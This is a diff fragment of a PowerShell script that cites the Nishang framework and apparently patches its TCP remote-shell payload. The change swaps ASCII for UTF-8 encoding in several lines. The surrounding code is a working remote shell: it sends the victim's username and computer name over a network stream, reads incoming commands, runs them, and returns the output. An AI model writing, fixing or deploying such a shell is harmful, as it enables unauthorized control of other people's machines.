@@ -81,16 +81,16 @@ https://github.com/samratashok/nishang
         [byte[]]$bytes = 0..65535|%{0}
 
         #Send back current username and computername
-        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $sendbytes = ([text.encoding]::GetEncoding('UTF-8')).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
         $stream.Write($sendbytes,0,$sendbytes.Length)
 
         #Show an interactive PowerShell prompt
-        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+        $sendbytes = ([text.encoding]::GetEncoding('UTF-8')).GetBytes('PS ' + (Get-Location).Path + '>')
         $stream.Write($sendbytes,0,$sendbytes.Length)
 
         while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
         {
-            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $EncodedText = New-Object -TypeName System.Text.UTF8Encoding
             $data = $EncodedText.GetString($bytes,0, $i)
             try
             {
@@ -108,7 +108,7 @@ https://github.com/samratashok/nishang
             $sendback2 = $sendback2 + $x
 
             #Return the results
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $sendbyte = ([text.encoding]::GetEncoding('UTF-8')).GetBytes($sendback2)
             $stream.Write($sendbyte,0,$sendbyte.Length)
             $stream.Flush()  
         }
